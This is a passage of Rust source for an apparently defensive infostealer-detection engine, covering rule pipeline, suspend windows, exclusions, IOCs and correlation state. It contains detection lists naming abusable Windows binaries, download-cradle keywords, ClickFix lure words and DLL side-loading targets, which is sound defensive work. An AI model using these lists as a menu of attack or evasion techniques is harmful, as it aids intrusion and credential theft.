//! Engine internals: per-event dispatch, builtin rules ST-01…ST-16 / TP-01…TP-05,
//! IOCs, exclusions, custom Sigma rules, per-process correlation state and the
//! "suspend on suspicion" verdict window.
//!
//! # Pipeline
//!
//! `process(event)` updates the process table (ProcessStart / ProcessStop),
//! dispatches the event to the rules for its kind, then evaluates custom Sigma
//! rules routed to that kind. Every rule hit goes through one emission path
//! ([`EngineState::emit`]):
//!
//! 1. rule mode from `Policy::rules`, else the rule's default (`Off` → dropped);
//! 2. never the Kestrel agent itself, PID 0 / 4 (tamper reports excepted);
//! 3. an `Allow` IOC on the process's sha256 / signer suppresses every rule;
//! 4. exclusions (path glob with drive, `*` = one segment, `**` = any depth;
//!    sha256; signer with a *valid* signature; image name; global or per
//!    rule; honouring `expires_at`) suppress the alert — never for TP-* rules;
//! 5. dedup: one alert per rule per process GUID per 10 minutes, except
//!    escalations (a strong rule that would kill a process held in a suspend
//!    window). A deduplicated re-hit in Protect mode still emits its *new*
//!    actions (e.g. a block for a new exfil destination) as `Output::Action`;
//! 6. Audit → alert without actions; Protect → alert with actions. Actions are
//!    filtered: critical OS processes and Microsoft security products
//!    ([`crate::protect`]: exact location on the system volume + valid
//!    Microsoft signature) are never killed or suspended, only images in
//!    user-writable locations are quarantined, shared OS binaries never lose
//!    their network, and the Kestrel server IPs are never blocked.
//!
//! # Trust
//!
//! `SignatureState::Unknown` is never trusted (owners, benign readers,
//! allow-IOCs, signer exclusions, protected processes). The platform computes
//! hash + signature synchronously for first-seen images within a budget and
//! re-feeds late facts through [`EngineState::enrich_process`], which re-runs
//! hash/certificate IOCs, ST-12 and ST-08(b) and re-judges suspend windows.
//!
//! # Suspend on suspicion
//!
//! A user-mode sensor is asynchronous, so a stealer could finish before a
//! correlation completes. In Protect mode, ST-01 (credential-store read by an
//! untrusted process), ST-03 (foreign DPAPI unprotect) and the opt-in ST-12
//! (untrusted execution from user paths) emit `SuspendProcess` and open a
//! verdict window of `policy.suspend_window_ms` for that GUID:
//!
//! * if a **strong rule** (ST-02, ST-04, ST-07, ST-16) fires in Protect mode
//!   for the suspended GUID — or for its parent or one of its children, since a
//!   frozen process cannot itself connect out — the strong rule's alert carries
//!   `KillProcess{tree:true}` for the suspended process plus `QuarantineFile`
//!   of its image (and `BlockDestination` for ST-04's address) and the window
//!   closes;
//! * if the window expires (`tick`) and the process is **unsigned, invalidly
//!   signed or still unknown, runs from a user-writable path, and was caught
//!   by ST-01 or ST-03**,
//!   `tick` returns `Output::Action(KillProcess{tree:true})` and
//!   `Output::Action(QuarantineFile)`;
//! * otherwise the window expires with `Output::Action(ResumeProcess)`;
//! * if the process exits while suspended, the window is dropped silently.
//!
//! A strong rule in Audit mode never escalates a window; the window then runs
//! to expiry as above.
//!
//! # Correlation state
//!
//! Per process GUID: categories of secrets read (last-touch time per
//! category), stores touched (for the plain-language summary), accumulated
//! `data_at_risk`, matched evidence (≤ 20 events), time of the last
//! untrusted credential read and foreign DPAPI unprotect, DNS answers
//! (IP → host, bounded), ST-13 candidacy and per-rule last-fired times.
//! Global: recent browser terminations and kill intents (ST-08), Chromium
//! remote-debugging ports seen on command lines (ST-06), pending ClickFix
//! kills (ST-10). State is dropped when the process is evicted from the table
//! or after 15 minutes of inactivity.
//!
//! A credential read only counts for ST-02 / ST-04 when it satisfies the
//! ST-01 condition (non-owner, not on the benign-reader allow-list, not a
//! trusted Windows binary) and the process is not excluded from ST-01;
//! likewise DPAPI events count only when not excluded from ST-03. Excluding a
//! backup tool from ST-01 therefore also stops ST-02/ST-04 for its reads.

use crate::canary::{self, is_conditional_canary};
use crate::catalog::*;
use crate::families::{Ctx, Family, FamilyHit};
use crate::identity;
use crate::paths::{
    benign_reader_for, glob_match, glob_match_path, is_browser_image, is_canary_ignored_reader,
    is_chromium_image, is_mozilla_image, is_trusted_owner, is_untrusted_location_or_signature,
    match_normalized, may_be_sensitive, normalize_path, SensitiveStore,
};
use crate::protect;
use crate::sigma::{self, SigmaEvent, SigmaRule};
use crate::util::*;
use crate::{CanarySpec, DetectError, Detection, HostContext, Output, ProcessTable};
use kestrel_common::*;
use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::{Mutex, OnceLock};
use uuid::Uuid;

const DEDUP_MS: i64 = 10 * 60 * 1000;
/// NEW-1: a removed autorun that comes back is removed again, at most once
/// per this interval per object (a re-plant inside it is removed when it ends).
const AUTORUN_REISSUE_MS: i64 = 30_000;
const MAX_AUTORUN_REISSUE: usize = 4096;
const ST02_WINDOW_MS: i64 = 60_000;
const ST02_MIN_CATEGORIES: usize = 3;
const ST04_WINDOW_MS: i64 = 300_000;
/// Fix round 2026-10-25 (corpus `evasion_slow_exfil_10min`): reads, then an
/// upload of at least [`ST04_SLOW_MIN_BYTES`] within this window.
const ST04_SLOW_WINDOW_MS: i64 = 30 * 60 * 1000;
/// The sensor re-reports a flow's `bytes_sent` at 1 KB, 64 KB, 1 MB, 16 MB.
const ST04_SLOW_MIN_BYTES: u64 = 64 * 1024;
/// A single UDP datagram to 443 of at most this size is a QUIC Initial
/// (Chromium pads it to 1,250 bytes): a handshake, not an upload.
const QUIC_INITIAL_MAX_BYTES: u64 = 1_500;
/// Process-tree credential records (ST-02 / ST-04 across the tree).
const TREE_TTL_MS: i64 = ST04_SLOW_WINDOW_MS;
const MAX_TREE: usize = 4096;
const MAX_TREE_DEPTH: usize = 6;
/// BITS upload jobs created by a process tree (ST-04 via the BITS service).
const BITS_JOB_TTL_MS: i64 = ST04_SLOW_WINDOW_MS;
const MAX_TAINTED: usize = 8192;
/// A browser update (installer / updater run) explains the browser closing
/// and the elevation service starting (FP-18).
const BROWSER_UPDATE_WINDOW_MS: i64 = 5 * 60 * 1000;
/// FP-14: in Protect, a binary (by sha256) whose ST-12 suspend windows
/// ended in a resume this many times is no longer suspended for 7 days.
const ST12_PROTECT_RESUMES: u32 = 3;
const ST08_WINDOW_MS: i64 = 1_000;
const ST08_MIN_STOPS: usize = 2;
const ST08_ATTRIBUTION_MS: i64 = 5_000;
const CLICKFIX_WINDOW_MS: i64 = 10_000;
const DEBUG_PORT_TTL_MS: i64 = 30 * 60 * 1000;
const STATE_IDLE_MS: i64 = 15 * 60 * 1000;
const EVICT_INTERVAL_MS: i64 = 10_000;
const MAX_EVIDENCE: usize = 20;
const MAX_ANCESTRY: usize = 6;
const MAX_DNS_PER_PROC: usize = 256;
const MAX_TOUCHED: usize = 32;
const BLOCK_TTL_SECS: u64 = 24 * 3600;
/// Restart Manager files-in-use check masks seen from the msiserver service
/// (soak 2026-10-21: 0x411 = QUERY_INFORMATION | VM_READ | TERMINATE) and the
/// QUERY_LIMITED_INFORMATION (0x1000) variants of the same check.
const RM_ACCESS_MASKS: &[u32] = &[0x411, 0x1410, 0x1411];
const NUM_CATEGORIES: usize = 14;
const LARGE_IMAGE_BYTES: u64 = 100 * 1024 * 1024;

/// Windows binaries attackers abuse; never treated as "trusted system" readers.
const LOLBINS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msbuild.exe",
    "regasm.exe",
    "regsvcs.exe",
    "installutil.exe",
    "addinprocess.exe",
    "addinprocess32.exe",
    "aspnet_compiler.exe",
    "csc.exe",
    "vbc.exe",
    "jsc.exe",
    "esentutl.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "curl.exe",
    "robocopy.exe",
    "xcopy.exe",
    "conhost.exe",
    "forfiles.exe",
    "msiexec.exe",
    "wmic.exe",
    "cmstp.exe",
    "dllhost.exe",
    "hh.exe",
    "odbcconf.exe",
    "pcalua.exe",
    "tar.exe",
    "makecab.exe",
    "finger.exe",
    "msxsl.exe",
    "mavinject.exe",
    "control.exe",
    "installutil.exe",
    "cvtres.exe",
    "ilasm.exe",
    "caspol.exe",
    "applaunch.exe",
    "dfsvc.exe",
    "presentationhost.exe",
];

/// .NET Framework binaries used as hollowing hosts (ST-13).
const DOTNET_LOLBINS: &[&str] = &[
    "msbuild.exe",
    "regasm.exe",
    "regsvcs.exe",
    "installutil.exe",
    "addinprocess.exe",
    "addinprocess32.exe",
    "aspnet_compiler.exe",
    "vbc.exe",
    "csc.exe",
    "jsc.exe",
    "cvtres.exe",
    "ilasm.exe",
    "caspol.exe",
    "applaunch.exe",
    "aspnet_regbrowsers.exe",
    "dfsvc.exe",
];

/// Expected (developer tooling) parents of .NET build binaries.
const DOTNET_EXPECTED_PARENTS: &[&str] = &[
    "devenv.exe",
    "msbuild.exe",
    "dotnet.exe",
    "servicehub.host.dotnet.x64.exe",
    "vbcscompiler.exe",
    "code.exe",
    "rider64.exe",
    "msvsmon.exe",
    "tfsbuildservice.host.exe",
    "agent.worker.exe",
    "runner.worker.exe",
    "jenkins.exe",
    "java.exe",
    "cmd.exe",
    "nuget.exe",
    "vsixinstaller.exe",
];

/// Shells / script hosts and LOLBins that ClickFix payloads run through (ST-11).
const CLICKFIX_SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "cmd.exe"];
const CLICKFIX_LOLBINS: &[&str] = &[
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msiexec.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "curl.exe",
    "conhost.exe",
    "forfiles.exe",
    "msbuild.exe",
    "finger.exe",
    "wget.exe",
    "pcalua.exe",
    "hh.exe",
];
/// Names a RunMRU / TypedPaths entry may invoke (ST-10).
const RUNMRU_LOLBINS: &[&str] = &[
    "powershell",
    "pwsh",
    "mshta",
    "curl",
    "conhost",
    "forfiles",
    "cmd",
    "msiexec",
    "rundll32",
    "certutil",
    "bitsadmin",
    "wscript",
    "cscript",
    "regsvr32",
    "finger",
    "wget",
];
const LURE_WORDS: &[&str] = &[
    "captcha",
    "robot",
    "human",
    "verif",
    "cloudflare",
    "turnstile",
    "ray id",
    "i am not",
    "i'm not",
    "security check",
    "confirm",
    "validation",
    "press enter",
    "authenticat",
    "access code",
    "fix",
];
const CRADLE_WORDS: &[&str] = &[
    "downloadstring",
    "downloadfile",
    "downloaddata",
    "net.webclient",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "invoke-expression",
    "frombase64string",
    "[char]",
    "-join",
    "msxml2.xmlhttp",
    "winhttp.winhttprequest",
];
const CRADLE_TOKENS: &[&str] = &["iex", "irm", "iwr", "wget", "curl"];

/// Benign bundled-NSS users (ST-09).
const NSS_BUNDLERS: &[&str] = &[
    "soffice.bin",
    "soffice.exe",
    "sbase.exe",
    "swriter.exe",
    "zotero.exe",
    "postbox.exe",
    "pidgin.exe",
];

/// Chromium application directories trusted by the elevation service (ST-08).
const BROWSER_APP_DIRS: &[&str] = &[
    r"\google\chrome\application\",
    r"\google\chrome beta\application\",
    r"\google\chrome dev\application\",
    r"\google\chrome sxs\application\",
    r"\microsoft\edge\application\",
    r"\microsoft\edge beta\application\",
    r"\microsoft\edge dev\application\",
    r"\microsoft\edge sxs\application\",
    r"\bravesoftware\brave-browser\application\",
    r"\bravesoftware\brave-browser-beta\application\",
    r"\chromium\application\",
    r"\vivaldi\application\",
];

/// ST-15: trusted components and their legitimate install directories.
const SIDELOAD_HOSTS: &[&str] = &[
    "mpcmdrun.exe",
    "nissrv.exe",
    "msmpeng.exe",
    "mpdlpcmd.exe",
    "mpcopyaccelerator.exe",
    "configsecuritypolicy.exe",
    "msedge.exe",
    "msedge_proxy.exe",
    "msedgewebview2.exe",
];
const SIDELOAD_DLLS: &[&str] = &["mpclient.dll", "msedge_elf.dll", "mpsvc.dll"];
const SIDELOAD_LEGIT_DIRS: &[&str] = &[
    r"\program files\windows defender\",
    r"\program files (x86)\windows defender\",
    r"\programdata\microsoft\windows defender\platform\",
    r"\program files\microsoft\edge\application\",
    r"\program files (x86)\microsoft\edge\application\",
    r"\program files (x86)\microsoft\edgewebview\application\",
    r"\program files\microsoft\edgewebview\application\",
    r"\program files (x86)\microsoft\edge beta\application\",
    r"\program files (x86)\microsoft\edge dev\application\",
    r"\appdata\local\microsoft\edge sxs\application\",
    r"\windows\system32\",
    r"\windows\syswow64\",
];

/// Red-team round 2 (2026-10-25): Windows DLLs that programs resolve from
/// their own folder before System32 and that DLL side-loading uses.
const SIDELOAD_SYSTEM_DLLS: &[&str] = &[
    "version.dll",
    "winhttp.dll",
    "wininet.dll",
    "dbghelp.dll",
    "dbgcore.dll",
    "userenv.dll",
    "cryptbase.dll",
    "cryptsp.dll",
    "dwmapi.dll",
    "uxtheme.dll",
    "wtsapi32.dll",
    "winmm.dll",
    "msimg32.dll",
    "profapi.dll",
    "secur32.dll",
    "sspicli.dll",
    "netapi32.dll",
    "iphlpapi.dll",
    "dnsapi.dll",
    "mpr.dll",
    "propsys.dll",
    "wldp.dll",
    "amsi.dll",
    "dxgi.dll",
    "d3d9.dll",
    "winspool.drv",
];
/// Chromium core DLLs, loaded from the browser's `<version>` folder.
const CHROMIUM_CORE_DLLS: &[&str] = &[
    "chrome_elf.dll",
    "chrome.dll",
    "msedge_elf.dll",
    "msedge.dll",
];

/// Is `path` inside a `\<digits and dots>\` version folder?
fn in_version_dir(path: &str) -> bool {
    let n = normalize_path(path);
    let mut comps: Vec<&str> = n.split('\\').collect();
    comps.pop();
    comps.iter().any(|c| {
        c.contains('.') && !c.is_empty() && c.bytes().all(|b| b.is_ascii_digit() || b == b'.')
    })
}

/// Services that legitimately talk to a dead-drop domain (ST-14 owner exemption).
const DOMAIN_OWNERS: &[(&str, &[&str])] = &[
    (
        "telegram.org",
        &[
            "telegram.exe",
            "ayugram.exe",
            "kotatogram.exe",
            "64gram.exe",
            "updater.exe",
        ],
    ),
    ("t.me", &["telegram.exe"]),
    (
        "steamcommunity.com",
        &["steam.exe", "steamwebhelper.exe", "steamservice.exe"],
    ),
    (
        "steampowered.com",
        &["steam.exe", "steamwebhelper.exe", "steamservice.exe"],
    ),
    (
        "discord.com",
        &[
            "discord.exe",
            "discordptb.exe",
            "discordcanary.exe",
            "update.exe",
        ],
    ),
    (
        "discordapp.com",
        &[
            "discord.exe",
            "discordptb.exe",
            "discordcanary.exe",
            "update.exe",
        ],
    ),
    ("binance.org", &["binance.exe"]),
];

fn builtin_meta() -> &'static HashMap<String, RuleMeta> {
    static M: OnceLock<HashMap<String, RuleMeta>> = OnceLock::new();
    M.get_or_init(|| catalog().into_iter().map(|m| (m.id.clone(), m)).collect())
}

pub(crate) fn catalog() -> Vec<RuleMeta> {
    let mut v = builtin_catalog();
    v.extend(crate::families::catalog());
    v
}

fn cat_index(c: DataCategory) -> usize {
    c as usize
}

/// The Kestrel agent's own service key (or a subkey), not any service whose
/// name merely starts with "Kestrel" (lab VM: a `KestrelLabSvc` tripped TP-04).
/// `k` is lower-case. Also matches `ControlSet00N`.
fn is_kestrel_service_key(k: &str) -> bool {
    let Some(i) = k.find(r"\services\kestrelagent") else {
        return false;
    };
    let before = &k[..i];
    let after = &k[i + r"\services\kestrelagent".len()..];
    (before.ends_with(r"\currentcontrolset") || before.contains(r"\controlset0"))
        && (after.is_empty() || after.starts_with('\\'))
}

pub(crate) fn is_lolbin(name: &str) -> bool {
    LOLBINS.contains(&name)
}

// ---------------------------------------------------------------------------
// Exclusions & IOCs
// ---------------------------------------------------------------------------

struct Excl {
    kind: ExclusionKind,
    value: String,
    rule_id: Option<String>,
    expires_at: Option<TimestampMs>,
}

/// Normalise a path for exclusion matching: lower-case, `\`, keeps the drive
/// letter. Driveless rooted paths are anchored on the system drive; device
/// paths that were never mapped to a drive (`\Device\HarddiskVolumeN\…`)
/// return `None` (their volume is unknown, so they never match).
fn excl_path(path: &str, system_drive: char) -> Option<String> {
    let raw = path.trim().replace('/', "\\").to_ascii_lowercase();
    let raw = raw.trim_start_matches(r"\\?\").trim_start_matches(r"\??\");
    if raw.starts_with(r"\device\") && !raw.starts_with(r"\device\mup\") {
        return None;
    }
    let n = normalize_path(raw);
    if n.starts_with('\\') && !n.starts_with(r"\\") {
        Some(format!("{system_drive}:{n}"))
    } else {
        Some(n)
    }
}

impl Excl {
    fn new(x: &Exclusion, system_drive: char) -> Excl {
        let v = x.value.trim();
        let value = match x.kind {
            ExclusionKind::Path => excl_path(v, system_drive).unwrap_or_default(),
            ExclusionKind::Image => file_name_lower(v),
            _ => v.to_ascii_lowercase(),
        };
        Excl {
            kind: x.kind,
            value,
            rule_id: x.rule_id.clone(),
            expires_at: x.expires_at,
        }
    }

    /// Path exclusion semantics (M1): the full path **including the drive** is
    /// compared case-insensitively; `*` matches within one path segment,
    /// `**` across segments; a value without wildcards matches that file or,
    /// as a directory, everything below it (a trailing `\` forces directory).
    fn matches(&self, p: &ProcessInfo, rule: &str, now: TimestampMs, system_drive: char) -> bool {
        if self.value.is_empty() {
            return false;
        }
        if let Some(r) = &self.rule_id {
            if !r.eq_ignore_ascii_case(rule) {
                return false;
            }
        }
        if self.expires_at.is_some_and(|t| now >= t) {
            return false;
        }
        match self.kind {
            ExclusionKind::Sha256 => p
                .sha256
                .as_deref()
                .is_some_and(|h| h.eq_ignore_ascii_case(&self.value)),
            ExclusionKind::Signer => {
                p.signer
                    .as_deref()
                    .is_some_and(|s| s.trim().eq_ignore_ascii_case(&self.value))
                    && p.signed == SignatureState::Valid
            }
            ExclusionKind::Image => !p.image.is_empty() && file_name_lower(&p.image) == self.value,
            ExclusionKind::Path => {
                if p.image.is_empty() {
                    return false;
                }
                let Some(img) = excl_path(&p.image, system_drive) else {
                    return false;
                };
                if self.value.contains('*') || self.value.contains('?') {
                    glob_match_path(&self.value, &img)
                } else if self.value.ends_with('\\') {
                    img.starts_with(&self.value)
                } else {
                    img == self.value
                        || (img.starts_with(&self.value)
                            && img.as_bytes().get(self.value.len()) == Some(&b'\\'))
                }
            }
        }
    }
}

#[derive(Clone)]
struct IocHit {
    id: String,
    value: String,
    action: IocAction,
    description: String,
}

#[derive(Default)]
struct Iocs {
    hashes: HashMap<String, IocHit>,
    certs: HashMap<String, IocHit>,
    ips: HashMap<String, IocHit>,
    cidrs: Vec<(u128, u128, bool, IocHit)>,
    domains: Vec<(String, IocHit)>,
    urls: Vec<(String, IocHit)>,
}

fn ip_to_u128(ip: std::net::IpAddr) -> (u128, bool) {
    match ip {
        std::net::IpAddr::V4(v) => (u32::from(v) as u128, true),
        std::net::IpAddr::V6(v) => match v.to_ipv4_mapped() {
            Some(v4) => (u32::from(v4) as u128, true),
            None => (u128::from(v), false),
        },
    }
}

impl Iocs {
    fn build(list: &[Ioc]) -> Iocs {
        let mut s = Iocs::default();
        for i in list {
            let hit = IocHit {
                id: i.id.clone(),
                value: i.value.clone(),
                action: i.action,
                description: i.description.clone(),
            };
            let v = i.value.trim().to_ascii_lowercase();
            if v.is_empty() {
                continue;
            }
            match i.kind {
                IocKind::Sha256 => {
                    s.hashes.insert(v, hit);
                }
                IocKind::Certificate => {
                    s.certs.insert(v.replace([' ', ':'], ""), hit.clone());
                    s.certs.insert(v, hit);
                }
                IocKind::Ip => {
                    if let Some((addr, len)) = v.split_once('/') {
                        if let (Some(ip), Ok(len)) = (parse_ip(addr), len.parse::<u32>()) {
                            let (a, v4) = ip_to_u128(ip);
                            let bits = if v4 { 32 } else { 128 };
                            // Sanity bound: a /0../7 (v4) or /0../31 (v6) "IOC"
                            // is a mistake that would kill and block every
                            // process talking to the Internet. Ignore it.
                            if (v4 && len < 8) || (!v4 && len < 32) {
                                continue;
                            }
                            let len = len.min(bits);
                            let mask = if len == 0 {
                                0
                            } else {
                                (!0u128 << (bits - len)) & if v4 { 0xffff_ffff } else { !0 }
                            };
                            s.cidrs.push((a & mask, mask, v4, hit));
                        }
                    } else if let Some(ip) = parse_ip(&v) {
                        s.ips.insert(ip.to_string(), hit);
                    }
                }
                IocKind::Domain => s.domains.push((entry_host(&v), hit)),
                IocKind::Url => {
                    let host = entry_host(&v);
                    let bare = v.split("://").nth(1).unwrap_or(&v).to_string();
                    s.urls.push((bare, hit.clone()));
                    if !host.is_empty() && v.contains('/') {
                        // URL host also blocks resolution / connections to the host.
                        let mut h = hit;
                        h.description = if h.description.is_empty() {
                            format!("host of URL IOC {}", i.value)
                        } else {
                            h.description
                        };
                        s.domains.push((host, h));
                    }
                }
            }
        }
        s
    }

    fn by_hash(&self, p: &ProcessInfo) -> Option<&IocHit> {
        p.sha256
            .as_deref()
            .and_then(|h| self.hashes.get(&h.to_ascii_lowercase()))
    }

    fn by_cert(&self, p: &ProcessInfo) -> Option<&IocHit> {
        let s = p.signer.as_deref()?.trim().to_ascii_lowercase();
        self.certs.get(&s)
    }

    fn by_ip(&self, ip: &str) -> Option<&IocHit> {
        let parsed = parse_ip(ip)?;
        if let Some(h) = self.ips.get(&parsed.to_string()) {
            return Some(h);
        }
        let (a, v4) = ip_to_u128(parsed);
        self.cidrs
            .iter()
            .find(|(net, mask, cv4, _)| *cv4 == v4 && a & mask == *net)
            .map(|c| &c.3)
    }

    fn by_domain(&self, host: &str) -> Option<&IocHit> {
        let h = host.trim_end_matches('.').to_ascii_lowercase();
        self.domains
            .iter()
            .find(|(d, _)| host_matches(&h, d))
            .map(|d| &d.1)
    }

    fn by_url_in(&self, text_lower: &str) -> Option<&IocHit> {
        self.urls
            .iter()
            .find(|(u, _)| !u.is_empty() && text_lower.contains(u.as_str()))
            .map(|u| &u.1)
    }

    fn allowed_process(&self, p: &ProcessInfo) -> bool {
        self.by_hash(p)
            .is_some_and(|h| h.action == IocAction::Allow)
            || self
                .by_cert(p)
                .is_some_and(|h| h.action == IocAction::Allow && p.signed == SignatureState::Valid)
    }
}

// ---------------------------------------------------------------------------
// Per-process and global state
// ---------------------------------------------------------------------------

/// Why a credential-store read is alert-only (Low Audit ST-01, recorded so
/// ST-04 can stay Audit when nothing else was read).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BenignRead {
    No,
    /// `legit_apps::wam_client_reader`
    Wam,
    /// `legit_apps::dev_tool_reader`
    DevTool,
    /// `legit_apps::ms_wam_reader_per_user` (triage item 6): ST-04 stays
    /// Low Audit only towards a Microsoft endpoint.
    WamPerUser,
    /// `legit_apps::vendor_config_reader` (triage item 9).
    VendorConfig,
    /// Red-team round 2026-10-25 (`paths::own_folder_reader`): an owner name
    /// not pinned by the publisher table reading the store in its own
    /// application folder.
    OwnFolder,
}

#[derive(Default)]
struct ProcState {
    cat_ts: [Option<TimestampMs>; NUM_CATEGORIES],
    data_at_risk: Vec<DataCategory>,
    touched: Vec<(&'static str, &'static str)>,
    evidence: VecDeque<Event>,
    first_cred_ts: Option<TimestampMs>,
    last_cred_ts: Option<TimestampMs>,
    last_dpapi_ts: Option<TimestampMs>,
    /// Soak 2026-10-21 / re-review N2: credential reads were only WAM
    /// token-cache reads by a Microsoft-signed WAM client (ST-04 is then
    /// Audit-only); any other read or DPAPI unprotect sets `non_wam_cred`.
    wam_cred: bool,
    /// Lab 2026-10-21: DPAPI "Chromium" unprotect by a signed Program Files
    /// Electron app (its own safeStorage key).
    own_app_dpapi: bool,
    /// Owner's PC 2026-10-22: developer-tool credential stores (kubeconfig,
    /// Docker, cloud CLIs) read by a signed, non-interpreter Program Files
    /// developer tool (`legit_apps::dev_tool_reader`; ST-04 then Audit-only).
    dev_tool_cred: bool,
    /// Triage 2026-10-22 item 6: WAM token-cache reads by a per-user
    /// Microsoft-signed app (`legit_apps::ms_wam_reader_per_user`).
    ms_wam_cred: bool,
    /// Triage 2026-10-22 item 9: Steam client configuration read by a signed
    /// Program Files vendor service (`legit_apps::vendor_config_reader`).
    vendor_cfg_cred: bool,
    /// Red-team round 2026-10-25: own-folder reads by an unpinned owner name.
    own_folder_cred: bool,
    /// 2026-10-22: the one cloud provider (`legit_apps::cloud_provider`)
    /// whose developer-tool stores were read, while `non_provider_cred` is
    /// false (every credential read so far was that provider's store).
    cloud_provider: Option<&'static str>,
    /// Any credential read or DPAPI unprotect that is not one provider's store.
    non_provider_cred: bool,
    non_wam_cred: bool,
    /// Fix round 2026-10-25: a non-benign read of a credential-store
    /// *file* (not a DPAPI call).
    file_cred: bool,
    /// DPAPI unprotects of browser secrets: any with a description other
    /// than the generic "Chromium" (Electron / embedded Chromium key).
    dpapi_named: bool,
    /// A DPAPI "Chromium" unprotect counted as a credential signal.
    dpapi_chromium: bool,
    /// Sensor 2026-10-25: last read of this process's **own** profile
    /// `Local State` (its `--user-data-dir` or `%APPDATA%\<app>`).
    own_ls_ts: Option<TimestampMs>,
    /// A `Local State` of any other profile was read (foreign key).
    foreign_ls: bool,
    /// Provider service hosts contacted after provider-only reads (ST-04
    /// provider allowance: a region / service sweep is not SDK use).
    provider_hosts: Vec<String>,
    dns: HashMap<String, String>,
    st13: Option<&'static str>,
    fired: Vec<(String, TimestampMs)>,
    /// A kill was already ordered for this process (don't suspend it again).
    killed: bool,
    /// Fingerprints of response actions already ordered for hits on this
    /// process, so deduplicated re-hits only carry *new* actions (L9).
    ordered: HashSet<String>,
    last_activity: TimestampMs,
}

impl ProcState {
    fn add_category(&mut self, c: DataCategory, ts: TimestampMs) {
        self.cat_ts[cat_index(c)] = Some(ts);
        if !self.data_at_risk.contains(&c) {
            self.data_at_risk.push(c);
            self.data_at_risk.sort();
        }
    }
    fn categories_within(&self, now: TimestampMs, window: TimestampMs) -> usize {
        self.cat_ts
            .iter()
            .filter(|t| t.is_some_and(|t| t <= now && now - t <= window))
            .count()
    }
    fn touch(&mut self, app: &'static str, noun: &'static str) {
        if self.touched.len() < MAX_TOUCHED && !self.touched.contains(&(app, noun)) {
            self.touched.push((app, noun));
        }
    }
    fn add_evidence(&mut self, e: &Event) {
        if self.evidence.back() == Some(e) {
            return;
        }
        if self.evidence.len() >= MAX_EVIDENCE {
            self.evidence.pop_front();
        }
        self.evidence.push_back(e.clone());
    }
    fn cred_ts(&self) -> Option<TimestampMs> {
        match (self.last_cred_ts, self.last_dpapi_ts) {
            (Some(a), Some(b)) => Some(a.max(b)),
            (a, b) => a.or(b),
        }
    }
    fn last_fired(&self, rule: &str) -> Option<TimestampMs> {
        self.fired.iter().find(|(r, _)| r == rule).map(|f| f.1)
    }
    fn set_fired(&mut self, rule: &str, ts: TimestampMs) {
        if let Some(f) = self.fired.iter_mut().find(|(r, _)| r == rule) {
            f.1 = ts;
        } else {
            self.fired.push((rule.to_string(), ts));
        }
    }
}

/// Fix round 2026-10-25 (corpus finding 5 / 6): credential reads of one
/// untrusted process tree, keyed by every tree member from the reader up to
/// (excluding) its first trusted ancestor. Survives the reader's exit (PID
/// reuse safety: keys are process GUIDs).
#[derive(Debug, Clone)]
struct TreeCred {
    /// Most recent reader with a non-benign read, and its facts.
    reader: ProcessGuid,
    reader_info: Option<ProcessInfo>,
    /// Last non-benign read of the tree.
    last_ts: TimestampMs,
    first_ts: TimestampMs,
    cat_ts: [Option<TimestampMs>; NUM_CATEGORIES],
    /// Distinct readers (bounded).
    members: Vec<ProcessGuid>,
    /// Distinct store labels (bounded) and whether any is a high-value
    /// store (browser, wallet, messenger, password manager, mail, FTP, VPN).
    apps: Vec<&'static str>,
    high_value: bool,
    touched: Vec<(&'static str, &'static str)>,
}

impl TreeCred {
    fn categories_within(&self, now: TimestampMs, window: TimestampMs) -> usize {
        self.cat_ts
            .iter()
            .filter(|t| t.is_some_and(|t| t <= now && now - t <= window))
            .count()
    }
    /// Strong enough to link a sender that is not the reader's direct
    /// relative: a high-value store or two different stores.
    fn linkable(&self) -> bool {
        self.high_value || self.apps.len() >= 2
    }
}

#[derive(Debug, Clone)]
struct SuspendWindow {
    guid: ProcessGuid,
    pid: u32,
    image: String,
    sha256: Option<String>,
    quarantine: bool,
    deadline: TimestampMs,
    kill_at_expiry: bool,
    /// The opening rule kills at expiry when the image turns out to be
    /// untrusted (ST-01 / ST-03); re-judged on late enrichment.
    kill_capable: bool,
    /// FP-14: ST-12 first-seen identity (sha256 only) of the suspended
    /// binary; a resume at expiry is counted for it.
    st12_key: Option<String>,
}

struct ClickfixPending {
    writer: ProcessGuid,
    until: TimestampMs,
    lolbin: &'static str,
    protect: bool,
}

#[derive(Default)]
struct CanaryState {
    /// Armed driveless prefixes (directories or files).
    armed: Vec<String>,
    /// Offered conditional decoys (armed on confirmation).
    conditional: Vec<String>,
}

/// One rule hit, before mode / exclusion / dedup handling.
struct Hit {
    rule: String,
    guid: ProcessGuid,
    severity: Severity,
    summary: String,
    /// Proposed Protect-mode actions (filtered at emission).
    actions: Vec<ResponseAction>,
    /// Open a suspend window (Protect only).
    suspend: bool,
    /// Kill instead of resume at window expiry.
    kill_at_expiry: bool,
    /// Strong rule: escalates suspend windows of this process / parent / children.
    strong: bool,
    /// (ip, port, image scope of the block: `None` = host-wide).
    escalation_ip: Option<(String, u16, Option<String>)>,
    /// Extra evidence (events of other processes).
    extra_evidence: Vec<Event>,
    /// Tamper reports: skip agent self-suppression.
    tamper: bool,
    /// Process override (when the subject isn't in the table).
    process: Option<ProcessInfo>,
    /// Force mode (IOC block / audit).
    mode_override: Option<RuleMode>,
    /// Metadata override (Sigma / IOC).
    name: Option<String>,
    author: Option<String>,
    attack: Option<Vec<String>>,
    /// Dedup key when it differs from the rule id (IOC alerts dedup per indicator).
    dedup_key: Option<String>,
    /// Only `RemoveAutorun` actions survive; no suspend / kill / quarantine.
    /// With an [`unknown_subject`] this is the one way a pid-0 subject is
    /// emitted (V-H7).
    remediation_only: bool,
}

/// Guid prefix of the synthetic subject used for persistence / credential
/// changes whose writer is unknown (`Attribution::None`, pid 0).
pub(crate) const UNKNOWN_WRITER_PREFIX: &str = "unattributed:";

/// Synthetic alert subject for an unattributed change: pid 0, no image, and
/// a guid derived from the changed object (`object`: registry key + value,
